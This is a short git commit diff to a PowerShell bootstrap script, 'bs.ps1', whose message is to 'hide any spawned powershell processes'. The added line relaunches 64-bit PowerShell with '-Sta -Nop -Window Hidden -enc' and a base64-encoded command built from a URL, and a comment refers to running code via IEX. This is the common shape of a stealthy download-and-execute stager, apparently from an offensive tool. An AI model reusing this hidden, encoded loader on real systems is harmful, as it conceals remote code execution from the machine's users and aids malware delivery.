0f257b7d54421a201bf0229403d65ffdd43974ab
Simon Clow <sc@sclow.com>
2021-06-22 22:15:36 +0100

    Modify bootstrap to hide any spawned powershell processes

--- supporting/bs.ps1
+++ supporting/bs.ps1
@@ -9,7 +9,7 @@ if (-not $([Environment]::Is64BitProcess) -and $([Environment]::Is64BitOperating
     #Write-Output("Upgrade's due")
     $ps64 = (join-path -Path ($pshome -replace "syswow64", "sysnative") -ChildPath "powershell.exe")
     $ENCODED=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($URL))
-    Write-Output('Start-Process -FilePath $ps64 -ArgumentList "-enc $ENCODED"')
+    Write-Output('Start-Process -FilePath $ps64 -ArgumentList "-Sta -Nop -Window Hidden -enc $ENCODED"')
 
 } else {
     # Either Running 32bit on 32bit, or running as 64 on 64; either way can use system32 and just IEX away!
